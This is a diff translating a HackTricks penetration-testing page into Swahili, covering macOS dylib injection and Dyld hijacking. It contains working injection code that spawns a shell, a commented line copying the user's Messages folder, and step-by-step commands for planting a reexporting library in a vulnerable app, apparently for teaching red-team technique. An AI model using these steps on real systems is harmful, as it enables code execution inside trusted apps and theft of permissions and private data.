@@ -1,23 +1,22 @@
-# macOS Dyld Hijacking & DYLD\_INSERT\_LIBRARIES
+# macOS Udukuzi wa Dyld & DYLD_INSERT_LIBRARIES
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Njia nyingine za kusaidia HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 
-## DYLD\_INSERT\_LIBRARIES Basic example
+## Mfano wa Msingi wa DYLD_INSERT_LIBRARIES
 
-**Library to inject** to execute a shell:
-
+**Mfano wa maktaba ya kuingiza** ili kutekeleza kikao cha amri:
 ```c
 // gcc -dynamiclib -o inject.dylib inject.c
 
@@ -29,35 +28,30 @@ __attribute__((constructor))
 
 void myconstructor(int argc, const char **argv)
 {
-    syslog(LOG_ERR, "[+] dylib injected in %s\n", argv[0]);
-    printf("[+] dylib injected in %s\n", argv[0]);
-    execv("/bin/bash", 0);
-    //system("cp -r ~/Library/Messages/ /tmp/Messages/");
+syslog(LOG_ERR, "[+] dylib injected in %s\n", argv[0]);
+printf("[+] dylib injected in %s\n", argv[0]);
+execv("/bin/bash", 0);
+//system("cp -r ~/Library/Messages/ /tmp/Messages/");
 }
 ```
-
-Binary to attack:
-
+Binaryi ya kushambulia:
 ```c
 // gcc hello.c -o hello
 #include <stdio.h>
 
 int main()
 {
-    printf("Hello, World!\n");
-    return 0;
+printf("Hello, World!\n");
+return 0;
 }
 ```
-
-Injection:
-
+Uingizaji:
 ```bash
 DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
+## Mfano wa Dyld Hijacking
 
-## Dyld Hijacking Example
-
-The targeted vulnerable binary is `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
+Binary inayolengwa na mdudu ni `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
 
 {% tabs %}
 {% tab title="entitlements" %}
@@ -71,13 +65,13 @@ The targeted vulnerable binary is `/Applications/VulnDyld.app/Contents/Resources
 ```bash
 # Check where are the @rpath locations
 otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep LC_RPATH -A 2
-          cmd LC_RPATH
-      cmdsize 32
-         path @loader_path/. (offset 12)
+cmd LC_RPATH
+cmdsize 32
+path @loader_path/. (offset 12)
 --
-          cmd LC_RPATH
-      cmdsize 32
-         path @loader_path/../lib2 (offset 12)
+cmd LC_RPATH
+cmdsize 32
+path @loader_path/../lib2 (offset 12)
 ```
 {% endcode %}
 {% endtab %}
@@ -87,9 +81,9 @@ otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep LC_RP
 ```bash
 # Check librareis loaded using @rapth and the used versions
 otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep "@rpath" -A 3
-         name @rpath/lib.dylib (offset 24)
-   time stamp 2 Thu Jan  1 01:00:02 1970
-      current version 1.0.0
+name @rpath/lib.dylib (offset 24)
+time stamp 2 Thu Jan  1 01:00:02 1970
+current version 1.0.0
 compatibility version 1.0.0
 # Check the versions
 ```
@@ -97,13 +91,12 @@ compatibility version 1.0.0
 {% endtab %}
 {% endtabs %}
 
-With the previous info we know that it's **not checking the signature of the loaded libraries** and it's **trying to load a library from**:
+Kwa habari tulizopata hapo awali tunajua kwamba **haichunguzi saini ya maktaba zilizopakia** na inajaribu kupakia maktaba kutoka:
 
 * `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 * `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
 
-However, the first one doesn't exist:
-
+Hata hivyo, ya kwanza haipo:
 ```bash
 pwd
 /Applications/VulnDyld.app
@@ -111,8 +104,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-
-So, it's possible to hijack it! Create a library that **executes some arbitrary code and exports the same functionalities** as the legit library by reexporting it. And remember to compile it with the expected versions:
+Basi, niwezekanavyo kuiteka! Unda maktaba ambayo **inatekeleza nambari isiyojulikana na kuuza kazi sawa** kama maktaba halali kwa kuuza upya. Na kumbuka kuikusanya na toleo lililotarajiwa:
 
 {% code title="lib.m" %}
 ```objectivec
@@ -120,12 +112,12 @@ So, it's possible to hijack it! Create a library that **executes some arbitrary 
 
 __attribute__((constructor))
 void custom(int argc, const char **argv) {
-    NSLog(@"[+] dylib hijacked in %s", argv[0]);
+NSLog(@"[+] dylib hijacked in %s", argv[0]);
 }
 ```
 {% endcode %}
 
-Compile it:
+Icompile:
 
 {% code overflow="wrap" %}
 ```bash
@@ -134,28 +126,28 @@ gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Found
 ```
 {% endcode %}
 
-The reexport path created in the library is relative to the loader, lets change it for an absolute path to the library to export:
+Njia ya kuuza upya iliyoundwa katika maktaba ni ya kulinganisha na mzigo, hebu ibadilishe kwa njia ya moja kwa moja kwa njia ya maktaba ya kuuza upya:
 
 {% code overflow="wrap" %}
 ```bash
 #Check relative
 otool -l /tmp/lib.dylib| grep REEXPORT -A 2
-         cmd LC_REEXPORT_DYLIB
-         cmdsize 48
-         name @rpath/libjli.dylib (offset 24)
+cmd LC_REEXPORT_DYLIB
+cmdsize 48
+name @rpath/libjli.dylib (offset 24)
 
 #Change the location of the library absolute to absolute path
 install_name_tool -change @rpath/lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" /tmp/lib.dylib
 
 # Check again
 otool -l /tmp/lib.dylib| grep REEXPORT -A 2
-          cmd LC_REEXPORT_DYLIB
-      cmdsize 128
-         name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
+cmd LC_REEXPORT_DYLIB
+cmdsize 128
+name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
 ```
 {% endcode %}
 
-Finally just copy it to the **hijacked location**:
+Hatimaye nakili kwenye **eneo lililodukuliwa**:
 
 {% code overflow="wrap" %}
 ```bash
@@ -163,35 +155,33 @@ cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
 {% endcode %}
 
-And **execute** the binary and check the **library was loaded**:
+Na **tekeleza** faili ya binary na angalia **maktaba ilipakia**:
 
 <pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
-<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
-</strong>Usage: [...]
+<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib imechukuliwa katika /Applications/VulnDyld.app/Contents/Resources/lib/binary
+</strong>Matumizi: [...]
 </code></pre>
 
 {% hint style="info" %}
-A nice writeup about how to abuse this vulnerability to abuse the camera permissions of telegram can be found in [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
+Maelezo mazuri kuhusu jinsi ya kutumia udhaifu huu kudhibiti ruhusa za kamera za telegram yanaweza kupatikana katika [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
 {% endhint %}
 
-## Bigger Scale
+## Kwa Kiwango Kubwa
 
-If you are planing on trying to inject libraries in unexpected binaries you could check the event messages to find out when the library is loaded inside a process (in this case remove the printf and the `/bin/bash` execution).
-
+Ikiwa unapanga kujaribu kuingiza maktaba katika faili za binary ambazo hazikutazamiwa, unaweza kuangalia ujumbe wa tukio ili kujua wakati maktaba inapakia ndani ya mchakato (katika kesi hii ondoa printf na utekelezaji wa `/bin/bash`).
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
-
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Njia nyingine za kusaidia HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
+* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
